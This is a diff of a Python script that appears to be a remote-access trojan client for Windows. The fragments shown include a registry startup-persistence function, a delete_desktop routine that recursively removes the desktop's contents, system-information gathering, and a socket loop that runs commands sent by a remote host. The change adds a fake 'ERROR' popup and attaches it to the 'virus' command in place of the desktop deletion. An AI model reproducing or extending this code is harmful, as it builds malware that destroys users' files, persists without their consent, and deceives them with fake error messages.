@@ -1,14 +1,15 @@
-import os
-import shutil
-from socket import socket
-import platform
-import psutil
-import time
-import locale
-import json
-import tkinter as tk
-import winreg as _winreg
 import getpass
+import json
+import locale
+import os
+import platform
+import shutil
+import time
+import winreg as _winreg
+from socket import socket
+from tkinter import messagebox
+
+import psutil
 
 
 def add_to_startup(file_path=""):
@@ -37,6 +38,9 @@ def delete_desktop():
                 shutil.rmtree(file_path)
         except Exception as e:
             print(f"Failed to delete {file_path}. Reason: {e}")
+
+def fake_alert():
+    messagebox.showwarning("ERROR", "0x4533")
 
 
 def get_system_info():
@@ -124,7 +128,8 @@ def start_client(host, port):
                 client.send("Successfly!".encode())
 
             elif command == "virus":
-                delete_desktop()
+                fake_alert()
+
 
 
             else:
